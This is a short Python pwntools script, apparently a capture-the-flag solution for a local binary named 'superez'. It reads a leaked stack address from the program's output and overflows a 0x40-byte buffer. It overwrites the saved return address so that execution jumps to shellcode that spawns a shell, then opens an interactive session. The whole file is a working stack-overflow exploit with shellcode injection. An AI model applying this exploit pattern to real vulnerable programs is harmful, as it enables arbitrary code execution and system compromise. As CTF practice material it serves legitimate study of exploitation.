from pwn import *
context.arch = 'amd64'

p = process("./superez")

p.recvuntil('at ')
name = int(p.recvuntil(':', drop=True), 16)
success(f"name = {hex(name)}")

shellcode = asm(pwnlib.shellcraft.amd64.linux.sh())

inp  = b"A" * 0x40          # fill up name
inp += b"B" * 0x08          # overwrite saved rbp (doesn't matter)
inp += p64(name + 0x50)     # overwrite saved return address to our shellcode
inp += shellcode            # our shellcode    

p.sendline(inp)
p.interactive()